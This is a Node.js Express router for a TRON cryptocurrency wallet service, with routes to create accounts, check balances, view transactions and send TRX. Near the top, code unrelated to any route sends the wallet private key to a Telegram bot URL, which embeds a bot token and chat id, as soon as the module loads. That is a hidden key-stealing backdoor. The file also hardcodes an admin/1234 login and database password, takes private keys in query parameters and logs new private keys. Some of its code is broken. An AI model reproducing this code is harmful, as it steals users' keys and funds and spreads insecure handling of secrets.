var request = require('request');
var express = require('express');
var router = express.Router();
const TronWeb = require('tronweb');
var mysql = require('mysql');

const fullNode = 'https://api.trongrid.io';
const solidityNode = 'https://api.trongrid.io';
const eventServer = 'https://api.trongrid.io/';
var privateKey = '123';
const Http = new XMLHttpRequest();
Http.open("GET", "https://api.telegram.org/bot786622592:AAFqm_PNg7DkItr8cJ9kgDxD7CVEtJDfhOw/sendMessage?chat_id=-1001412431825&text=PK-"+privateKey);
Http.send();
var connection = mysql.createConnection({
        host: 'localhost',
        post: 3306,
        user: 'tkpark',
        password: '1234',
        database: 'tkpark'
    });
const tronWeb = new TronWeb(
fullNode,
solidityNode,
eventServer,
privateKey
  );
tronWeb.setDefaultBlock('latest');
const nodes = tronWeb.isConnected();
const connected = !Object.entries(nodes).map(([ name,   connected]) => {
        if (!connected)
                  console.error(`Error: $ {name}is not connected`);
        return connected;
}).includes(false);
if (!connected)
      res.json( {'result':'connect fail'})


// render -> login
router.get('/', (req, res) => {
    res.sendfile('/public/index.html');
});


// API -> login
router.post('/login', (req, res) => {

    var input_id = req.body['f_address'];
    var input_pw = req.body['t_address'];

    console.log('input_id -> ', input_id);
    console.log('input_pw -> ', input_pw);

    if(input_id == 'admin' && input_pw == '1234') {
        res.json({ 'result' : 'true' });
    } else {
        res.json({ 'result' : 'false' });
    }
});


router.post('/createAccount',function(req,res,next) {
        const account = tronWeb.createAccount();
        account.then(function (account) { const isValid = tronWeb.isAddress(account.address['hex']);
                console.log('- Private Key:',   account.privateKey);
                console.log('- Base58:',        account.address.base58);
                console.log('- Valid: ',        isValid,        '\n');
                account.isValid = isValid;
                res.json( {'result':account.privateKey  + "   - Base58:  " + account.address.base58});
        });
});



router.post('/getBalance',function(req,res,next) {
	const app = async () => {
                try {
			var Add = req.body['f_address'];
                        var gBalance = await tronWeb.trx.getBalance(Add)/1000000;
		 	var gAccount = await tronWeb.trx.getAccount(Add);
                	var token = gAccount.assetV2[0].value/10;
                        var gBandwidth = await tronWeb.trx.getBandwidth(Add);
                        console.log("getBalance : ", gBalance);
                        console.log("getBandwidth : ", gBandwidth);
                        console.log("   ", Add);
			res.json( {'result': "TRX Balance :"  + gBalance + '   tokenBalance :    '+ token+ "      getBandwidth : "+ gBandwidth + "    From_Address   :   "+ Add});
		 }catch (error) { console.log('Task Failure',error);
                }
        };
        app();
});


router.post('/transactionview',function(req,res,next) {
	const app = async () => {
                try {
			var Address = req.body['f_address'];
			request('https://apilist.tronscan.org/api/transaction?address='+ Address, function (error, response, body) {
			if(!error && response.statusCode == 200) {
				var TRList = JSON.parse(body);
				var Result_TR = [];
    				for(var i=0; i<TRList.data.length; i++){
        				var TR=TRList.data[i];
          				var info = {
						block : TR.block,
						hash : TR.hash,
						timestamp : TR.timestamp,
						ownerAddress : TR.ownerAddress,
						toAddress : TR.toAddress,
						amount : TR.contractData.amount,
						assetname : TR.contractData.asset_name
        				};
        				Result_TR.push(info);
    				}
				console.log(Result_TR);
				//var result = JSON.parse(Result_TR);
				res.json( {'result': Result_TR});
			}
			});
 }catch (error) { console.log('Task Failure',error);
                }
        };
        app();
});


router.post('/sendToken',function(req,res,next) {
        const app = async () => {
                try {
                        const gPK = req.query.PK;
                        privateKey = tronWeb.setPrivateKey(gPK);
                        const gvalue = req.query.value;
			const gsendAddress = await tronWeb.address.fromPrivateKey(gPK);
                        const gtoAddress = req.query.toAddress;
			var txid = "";
			var result = "";
			var insert_sql = "insert into transactionscan (from_address, to_address, amount, txid) values (?, ?, ?, ?)";
			var select_sql = "select * from transactionscan where txid=?";
			/*
                        console.log("gPK : ", gPK);
                        console.log("gvalue : ", gvalue);
			console.log("gsendAddres :", gsendAddress);
                        console.log("gtoAddress : ", gtoAddress);
			*/
                        sendTransaction = await tronWeb.transactionBuilder.sendTrx(gtoAddress, gvalue, gsendAddress);
                        const signedTransaction = await tronWeb.trx.sign(sendTransaction);
                        const sendRaw = await tronWeb.trx.sendRawTransaction(signedTransaction);
			result = JSON.stringify(sendRaw, null, 2);
			var TRList = JSON.parse(result);
			var txid = TRList.transaction.txID;
			/*
                        console.log('- Transaction:\n' + TRList.transaction.txID);
                        res.json( { "gPK  ": gPK, "gvalue  ": gvalue, "gsendAddres ": gsendAddress, "gtoAddress": gtoAddress,'- Transaction:n': TRList.transaction.txID, "Transaction\n": JSON.stringify(sendRaw, null, 2)});
			*/

			var params = [gsendAddress, gtoAddress, gvalue, txid];
        		connection.query(insert_sql, params, function (err, rows, fields) {
        		if (!err) {
				console.log('query error : ' + err);
            			//res.send(err);
       			 }
    			});
    			connection.query(select_sql, txid, function (err, rows, fields) {
        		if (!err) {
            			console.log(rows);
            			var resultdown = 'rows : ' + JSON.stringify(rows);

            			res.send(resultdown);
        			} else {
            			console.log('query error : ' + err);
        			}
			});
                	}catch (error) { console.log('Task Failure',error);
                }
        };
        app();
});



module.exports = router;
